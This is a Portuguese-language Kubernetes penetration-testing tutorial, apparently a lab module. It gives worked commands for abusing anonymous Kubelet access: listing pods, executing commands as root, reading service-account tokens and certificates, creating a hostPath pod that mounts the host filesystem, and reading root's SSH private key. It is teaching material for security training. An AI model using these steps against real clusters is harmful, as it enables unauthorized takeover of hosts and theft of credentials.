**Kubernetes (K8s)** é uma plataforma de código aberto que revolucionou o desenvolvimento de software, simplificando a implantação e gerenciamento de contêineres de aplicativos. Desenvolvido pelo Google e agora mantido pela Cloud Native Computing Foundation, o Kubernetes é essencial para orquestrar microsserviços no universo DevOps. Ele oferece uma arquitetura adaptável, suportando múltiplos ambientes e permitindo a configuração, automação e dimensionamento eficientes de aplicações.

A arquitetura do Kubernetes inclui **master nodes** e **worker nodes**, garantindo a execução de aplicativos em contêineres isolados do sistema host. Isso proporciona uma camada de proteção adicional, mantendo a integridade dos aplicativos mesmo quando o sistema host é atualizado ou modificado. Compreender a segurança dos contêineres no Kubernetes é crucial para a administração e testes de penetração.

## Conceito K8s

O Kubernetes gira em torno do conceito de pods, que podem conter um ou mais contêineres intimamente conectados. Cada pod funciona como uma máquina virtual separada em um nó, completa com seu próprio IP, nome de host e outros detalhes.

O Kubernetes simplifica o gerenciamento de vários contêineres ao oferecer ferramentas para balanceamento de carga, descoberta de serviços, orquestração de armazenamento, autocorreção e muito mais. Apesar dos desafios em segurança e gerenciamento, o K8s continua a crescer e melhorar com recursos como `Role-Based Access Control`( `RBAC`), `Network Policies`, e `Security Contexts`, fornecendo um ambiente mais seguro para aplicativos.

Diferenças entre K8 e Docker

| **Função**   | **Docker**                                     | **Kubernetes**                                            |
| ------------ | ---------------------------------------------- | --------------------------------------------------------- |
| `Primary`    | Plataforma para conteinerização de aplicativos | Uma ferramenta de orquestração para gerenciar contêineres |
| `Scaling`    | Escalonamento manual com Docker Swarm          | Escala automática                                         |
| `Networking` | Rede única                                     | Rede complexa com políticas                               |
| `Storage`    | Volumes                                        | Ampla gama de opções de armazenamento                     |
A arquitetura do Kubernetes é dividida principalmente em dois tipos de componentes:

- `The Control Plane` (master node), que é responsável por controlar o cluster Kubernetes
    
- `The Worker Nodes`(minions), onde os aplicativos em contêineres são executados

### Nodes
O nó mestre hospeda o Kubernetes `Control Plane`, que gerencia e coordena todas as atividades dentro do cluster e também garante que o estado desejado do cluster seja mantido. Por outro lado, os `Minions` executam os aplicativos reais e recebem instruções do Control Plane e garantem que o estado desejado seja alcançado.

Ele abrange versatilidade na acomodação de várias necessidades, como suporte a bancos de dados, cargas de trabalho de IA/ML e microsserviços nativos da nuvem.

Além disso, ele é capaz de gerenciar aplicativos de alto recurso na borda e é compatível com diferentes plataformas. Portanto, ele pode ser utilizado em serviços de nuvem pública como Google Cloud, Azure e AWS ou em data centers privados no local.

### Control Plane
O Control Plane serve como camada de gerenciamento. Ele consiste em vários componentes cruciais, incluindo:

|**Serviço**|**Portas TCP**|
|---|---|
|`etcd`|`2379`,`2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|

#### Minions
Dentro de um ambiente conteinerizado, os `Minions`(nós de trabalho) servem como o local designado para executar aplicativos. É importante observar que cada nó é gerenciado e regulado pelo Control Plane, o que ajuda a garantir que todos os processos em execução dentro dos contêineres operem de forma suave e eficiente.

O `Scheduler`, com base no `API server`, entende o estado do cluster e agenda novos pods nos nós de acordo. Após decidir em qual nó um pod deve ser executado, o servidor de API atualiza o `etcd`.

O servidor de API é o ponto de entrada para todos os comandos administrativos, seja de usuários via kubectl ou dos controladores. Este servidor se comunica com o etcd para buscar ou atualizar o estado do cluster.

#### Medidas de segurança do K8
A segurança do Kubernetes pode ser dividida em vários domínios:

- Segurança da infraestrutura do cluster
- Segurança de configuração de cluster
- Segurança da aplicação
- Segurança de dados

Cada domínio inclui diversas camadas e elementos que devem ser protegidos e gerenciados adequadamente pelos desenvolvedores e administradores.

## API do Kubernetes

O núcleo da arquitetura do **Kubernetes** é sua **API**, que é o principal ponto de contato para interações internas e externas. A API permite o controle declarativo, onde os usuários definem o estado desejado do sistema, e o Kubernetes toma as medidas necessárias para alcançar esse estado. O **kube-apiserver** hospeda a API e gerencia solicitações RESTful para criar, modificar, excluir e recuperar informações sobre recursos no sistema. A API facilita a comunicação e o controle contínuo dentro do cluster.

Na estrutura do Kubernetes, um **recurso de API** atua como um ponto final que contém uma coleção de objetos de API, como **Pods**, **Serviços** e **Implantações**, entre outros, cada um pertencente a uma categoria específica.

Cada recurso exclusivo vem equipado com um conjunto distinto de operações que podem ser executadas, incluindo, mas não se limitando a:

|**Solicitar**|**Descrição**|
|---|---|
|`GET`|Recupera informações sobre um recurso ou uma lista de recursos.|
|`POST`|Cria um novo recurso.|
|`PUT`|Atualiza um recurso existente.|
|`PATCH`|Aplica atualizações parciais a um recurso.|
|`DELETE`|Remove um recurso.|

#### Autenticação
Em termos de autenticação, o Kubernetes suporta vários métodos, como certificados de cliente, tokens de portador, um proxy de autenticação ou autenticação básica HTTP, que servem para verificar a identidade do usuário.

Depois que o usuário é autenticado, o Kubernetes aplica decisões de autorização usando o Role-Based Access Control ( `RBAC`). Essa técnica envolve atribuir funções específicas a usuários ou processos com permissões correspondentes para acessar e operar em recursos.

No Kubernetes, o `Kubelet`pode ser configurado para permitir `anonymous access`. Por padrão, o Kubelet permite acesso anônimo. Solicitações anônimas são consideradas não autenticadas, o que implica que qualquer solicitação feita ao Kubelet sem um certificado de cliente válido será tratada como anônima.

Isso pode ser problemático, pois qualquer processo ou usuário que pode acessar a API do Kubelet pode fazer solicitações e receber respostas, potencialmente expondo informações confidenciais ou levando a ações não autorizadas.

#### Interação do servidor API do K8

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```


`System:anonymous`geralmente representa um usuário não autenticado, o que significa que não fornecemos credenciais válidas ou estamos tentando acessar o servidor de API anonimamente.

Nesse caso, tentamos acessar o caminho raiz, o que concederia controle significativo sobre o cluster do Kubernetes se bem-sucedido. Por padrão, o acesso ao caminho raiz é geralmente restrito a usuários autenticados e autorizados com privilégios administrativos e o servidor de API negou a solicitação, respondendo com um `403 Forbidden`código de status de acordo.

#### API do Kubelet - Extraindo Pods

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
...SNIP...
```

As informações exibidas na saída incluem `names`, `namespaces`, `creation timestamps`e `container images`dos pods. Elas também mostram o `last applied configuration`para cada pod, que pode conter detalhes confidenciais sobre as imagens do contêiner e suas políticas de pull.

Compreender as **imagens de contêiner** e suas versões no cluster Kubernetes pode ajudar a identificar e explorar vulnerabilidades conhecidas para obter acesso não autorizado. Informações de **namespace** fornecem uma visão sobre a organização dos pods e recursos, permitindo ataques direcionados a namespaces vulneráveis.

Metadados como **uid** e **resourceVersion** são úteis para reconhecimento e identificação de alvos potenciais. Além disso, revelar a configuração aplicada pode expor informações confidenciais, como senhas, segredos ou tokens de API usados na implantação dos pods.

#### Kubeletctl - Extraindo Pods

```shel-session
cry0l1t3@k8:~$kubeletctl -i --server 10.129.10.11 pods
```
<pre style="overflow-x:scroll; font-weight:500;;">
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</pre>

Para interagir efetivamente com pods dentro do ambiente Kubernetes, é importante ter uma compreensão clara dos comandos disponíveis. Uma abordagem que pode ser particularmente útil é utilizar o comando `scan rce` em `kubeletctl`. Este comando fornece insights valiosos e permite o gerenciamento eficiente de pods.

#### API do Kubelet - Comandos disponíveis

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce
```
<pre style="overflow-x:scroll; font-weight:500;;">
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</pre>

Também é possível que nos envolvamos com um contêiner interativamente e tenhamos insights sobre a extensão de nossos privilégios dentro dele. Isso nos permite entender melhor nosso nível de acesso e controle sobre o conteúdo do contêiner.

#### API Kubelet - Executando Comandos

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

A saída do comando mostra que o usuário atual que executa o `id`comando dentro do contêiner tem privilégios de root. Isso indica que obtivemos acesso administrativo dentro do contêiner, o que pode levar a vulnerabilidades de escalonamento de privilégios. Se obtivermos acesso a um contêiner com privilégios de root, podemos executar outras ações no sistema host ou em outros contêineres.

## Escalação de privilégios
Para obter privilégios mais altos e acessar o sistema host, podemos utilizar uma ferramenta chamada [kubeletctl](https://github.com/cyberark/kubeletctl) para obter a conta de serviço do Kubernetes `token`e `certificate`( `ca.crt`) do servidor.

Para fazer isso, precisamos fornecer o endereço IP do servidor, o namespace e o pod de destino. Caso obtenhamos esse token e certificado, podemos elevar nossos privilégios ainda mais, mover horizontalmente pelo cluster ou obter acesso a pods e recursos adicionais.

#### API do Kubelet - Extraindo Tokens

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

#### API Kubelet - Extraindo Certificados

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Agora que temos ambos `token`e `certificate`, podemos verificar os direitos de acesso no cluster do Kubernetes. Isso é comumente usado para auditoria e verificação para garantir que os usuários tenham o nível correto de acesso e não recebam mais privilégios do que precisam.

No entanto, podemos usá-lo para nossos propósitos e podemos perguntar aos K8s se temos permissão para executar ações diferentes em vários recursos.

#### Listar Privilégios

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Aqui podemos ver algumas informações muito importantes. Além dos selfsubject-resources `get`, podemos , `create` e `list` pods, que são os recursos que representam o contêiner em execução no cluster.

A partir daqui, podemos criar um arquivo `YAML` que podemos usar para criar um novo contêiner e montar todo o sistema de arquivos raiz do sistema host no diretório `/root` deste contêiner. 

A partir daí, podemos acessar os arquivos e diretórios do sistema host. O `YAML`arquivo pode ter a seguinte aparência:

#### Pod YAML
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Uma vez criado, podemos criar o novo pod e verificar se ele está funcionando conforme o esperado.

#### Criando um novo Pod
```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

Se o pod estiver em execução, podemos executar o comando e gerar um shell reverso ou recuperar dados confidenciais, como a chave SSH privada do usuário root.

#### Extraindo a chave SSH do Root

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```

















































































